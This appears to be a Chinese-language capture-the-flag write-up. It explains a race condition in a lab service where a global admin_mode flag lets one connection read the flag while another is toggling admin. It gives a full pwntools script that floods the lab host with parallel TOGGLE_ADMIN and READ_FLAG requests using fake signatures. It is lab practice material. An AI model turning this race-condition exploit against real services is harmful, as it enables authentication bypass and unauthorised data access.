



结合handle_client和TOGGLE_ADMIN流程，admin_mode的切换和重置是全局变量,一个线程刚通过签名校验，admin_mode还未重置，另一个线程即可直接利用admin权限读取flag。

这类漏洞常见利用方式：A线程发TOGGLE_ADMIN并提供签名，B线程几乎同时发READ_FLAG，利用admin_mode尚未重置的时机，B线程可无签名直接读取flag。



``` python

from pwn import *
import threading
import time

HOST = '734e1a3d120f.target.yijinglab.com'
PORT = 54371

THREADS = 100
INTERVAL = 0.0005
ROUNDS = 3

results = []

def worker_toggle():
    try:
        conn = remote(HOST, PORT, timeout=2)
        conn.recvuntil(b"Available commands:")
        conn.sendline(b"LOGIN user1 pass123")
        conn.recvuntil(b"Available commands:")
        conn.sendline(b"TOGGLE_ADMIN")
        conn.recvuntil(b"Please provide RSA signature")
        fake_sig = b"0" * 512
        conn.sendline(fake_sig)
        data = conn.recvall(timeout=2)
        results.append(data.decode(errors='ignore'))
        conn.close()
    except Exception as e:
        results.append(str(e))

def worker_readflag():
    try:
        conn = remote(HOST, PORT, timeout=2)
        conn.recvuntil(b"Available commands:")
        conn.sendline(b"LOGIN user1 pass123")
        conn.recvuntil(b"Available commands:")
        conn.sendline(b"READ_FLAG")
        conn.recvuntil(b"Please provide RSA signature")
        fake_sig = b"0" * 512
        conn.sendline(fake_sig)
        data = conn.recvall(timeout=2)
        results.append(data.decode(errors='ignore'))
        conn.close()
    except Exception as e:
        results.append(str(e))

def test_race():
    for _ in range(ROUNDS):
        threads = []
        for _ in range(THREADS):
            t1 = threading.Thread(target=worker_toggle)
            t2 = threading.Thread(target=worker_readflag)
            threads.append(t1)
            threads.append(t2)
            t1.start()
            t2.start()
            time.sleep(INTERVAL)
        for t in threads:
            t.join()
    with open("results.txt", "w", encoding="utf-8") as f:
        for res in results:
            f.write(res + "\n")

if __name__ == "__main__":
    test_race()

```



